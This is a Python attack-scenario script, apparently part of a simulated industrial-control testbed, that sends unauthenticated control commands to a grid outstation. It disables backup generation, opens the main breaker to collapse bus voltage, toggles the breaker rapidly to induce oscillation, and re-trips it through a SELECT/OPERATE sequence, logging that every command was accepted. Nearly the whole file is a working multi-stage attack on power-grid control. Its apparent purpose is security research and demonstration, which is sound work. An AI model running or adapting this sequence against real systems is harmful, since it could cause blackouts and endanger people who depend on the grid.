#!/usr/bin/env python3
"""Scenario 3 — Grid Disruption (Induce Instability)

ATT&CK for ICS Tactic: Impact
Technique: T0826 — Loss of Availability, T0827 — Loss of Control,
           T0831 — Manipulation of Control

Multi-stage attack to destabilize the electrical grid:
  Phase 1: Disable generator (remove backup generation)
  Phase 2: Open breaker (collapse voltage to near zero)
  Phase 3: Rapid breaker toggle (induce voltage oscillation)
  Phase 4: Restore grid, then re-collapse via SELECT/OPERATE (SBO)

Normal operating ranges:
  Bus voltage:    ~10-13 kV (breaker closed, generator providing partial load)
  Power deficit:  ~200 kW (with generator) to ~800 kW (without generator)
"""

import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from scenario_helpers import (
    ScenarioResult,
    ScenarioStep,
    connect,
    direct_operate_binary,
    save_result,
    select_operate_binary,
    send_integrity_poll,
    _now,
)

SETTLE_TIME = 2.0
TOGGLE_DELAY = 0.5


async def run() -> ScenarioResult:
    result = ScenarioResult(
        name="Grid Disruption",
        description=(
            "Multi-phase attack to destabilize the grid. Removes backup "
            "generation, collapses bus voltage, induces oscillation through "
            "rapid breaker toggling, and demonstrates a second collapse "
            "using the SELECT/OPERATE command sequence."
        ),
        attck_tactic="Impact (T0826, T0827, T0831)",
        timestamp=_now(),
    )

    print("=" * 60)
    print("SCENARIO 3: Grid Disruption (Induce Instability)")
    print("=" * 60)

    # --- Phase 1: Baseline ---
    print("\n[Phase 1] Capturing baseline state ...")
    channel = await connect()
    resp = await send_integrity_poll(channel)
    result.steps.append(
        ScenarioStep(
            action="baseline",
            detail="Integrity poll — baseline state captured",
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Integrity poll response: {resp}")

    # --- Phase 2: Remove backup generation ---
    print("\n[Phase 2] ATTACK: Disabling generator (BO[1] LATCH_OFF) ...")
    resp = await direct_operate_binary(channel, index=1, latch_on=False)
    result.steps.append(
        ScenarioStep(
            action="disable_generator",
            detail=(
                "DIRECT_OPERATE BO[1] LATCH_OFF — remove backup generation. "
                "Expected: voltage sags ~1-2 kV, deficit rises to full load"
            ),
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Response: {resp}")

    print(f"    Waiting {SETTLE_TIME}s for voltage sag ...")
    await asyncio.sleep(SETTLE_TIME)

    # --- Phase 3: Voltage collapse ---
    print(
        "\n[Phase 3] ATTACK: Opening breaker (BO[0] LATCH_OFF) — voltage collapse ..."
    )
    resp = await direct_operate_binary(channel, index=0, latch_on=False)
    result.steps.append(
        ScenarioStep(
            action="open_breaker",
            detail=(
                "DIRECT_OPERATE BO[0] LATCH_OFF — open main breaker. "
                "Expected: voltage collapses to ~0.05 kV"
            ),
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Response: {resp}")

    print(f"    Waiting {SETTLE_TIME}s for voltage collapse ...")
    await asyncio.sleep(SETTLE_TIME)

    # --- Phase 4: Rapid breaker toggle (oscillation) ---
    print("\n[Phase 4] ATTACK: Rapidly toggling breaker (oscillation) ...")
    for i in range(4):
        on = i % 2 == 0
        action = "LATCH_ON" if on else "LATCH_OFF"
        resp = await direct_operate_binary(channel, index=0, latch_on=on)
        result.steps.append(
            ScenarioStep(
                action=f"toggle_{i}",
                detail=f"DIRECT_OPERATE BO[0] {action} — toggle #{i+1}",
                response=resp,
                timestamp=_now(),
            )
        )
        print(f"    Toggle {i+1}: BO[0] {action} -> Response: {resp}")
        await asyncio.sleep(TOGGLE_DELAY)

    # --- Phase 5: Restore then re-collapse via SBO ---
    print("\n[Phase 5] Restoring grid, then re-collapsing via SELECT/OPERATE ...")

    # Restore: close breaker and start generator
    resp1 = await direct_operate_binary(channel, index=0, latch_on=True)
    resp2 = await direct_operate_binary(channel, index=1, latch_on=True)
    result.steps.append(
        ScenarioStep(
            action="restore_grid",
            detail=(
                f"Restored grid — BO[0] LATCH_ON ({resp1}), "
                f"BO[1] LATCH_ON ({resp2})"
            ),
            response=f"{resp1}, {resp2}",
            timestamp=_now(),
        )
    )
    print(f"    Restore breaker: {resp1}, generator: {resp2}")

    print(f"    Waiting {SETTLE_TIME}s for grid to stabilize ...")
    await asyncio.sleep(SETTLE_TIME)

    # SBO attack: trip breaker via SELECT/OPERATE
    print("    ATTACK: SELECT/OPERATE — trip breaker (BO[0] LATCH_OFF) ...")
    sel_resp, op_resp = await select_operate_binary(channel, index=0, latch_on=False)
    result.steps.append(
        ScenarioStep(
            action="sbo_trip_breaker",
            detail=(
                "SELECT/OPERATE BO[0] LATCH_OFF — two-step control attack. "
                "Expected: second voltage collapse"
            ),
            response=f"select={sel_resp}, operate={op_resp}",
            timestamp=_now(),
        )
    )
    print(f"    SELECT: {sel_resp}, OPERATE: {op_resp}")

    print(f"    Waiting {SETTLE_TIME}s for second voltage collapse ...")
    await asyncio.sleep(SETTLE_TIME)

    # Final state read
    resp = await send_integrity_poll(channel)
    result.steps.append(
        ScenarioStep(
            action="final_read",
            detail="Final integrity poll — grid should be in disrupted state",
            response=resp,
            timestamp=_now(),
        )
    )
    print(f"    Final integrity poll: {resp}")

    await channel.close()

    # Verify all commands were accepted
    all_responded = all("RESPONSE" in s.response for s in result.steps if s.response)
    result.passed = all_responded

    result.observations = [
        "Phase 2: Generator disabled — outstation accepted DIRECT_OPERATE without auth",
        "Phase 3: Breaker opened — voltage collapse to ~0.05 kV "
        "(verified by test_adversarial_open_breaker_drops_voltage_to_near_zero)",
        "Phase 4: 4 rapid breaker toggles executed — induces voltage oscillation "
        "between ~0 kV and partial recovery",
        "Phase 5: Grid restored then re-collapsed via SELECT/OPERATE — "
        "both SBO steps accepted, demonstrating two-step attack viability",
        "All 10 control commands accepted — no authentication or rate limiting",
        "Attack demonstrated both DIRECT_OPERATE and SELECT/OPERATE attack vectors",
        "State changes visible on outstation terminal monitor (display_loop)",
    ]

    print(f"\n{'PASS' if result.passed else 'FAIL'}: Grid disruption complete.")
    for obs in result.observations:
        print(f"  - {obs}")

    return result


def main() -> None:
    result = asyncio.run(run())
    path = save_result(result)
    print(f"\nResults saved to: {path}")


if __name__ == "__main__":
    main()
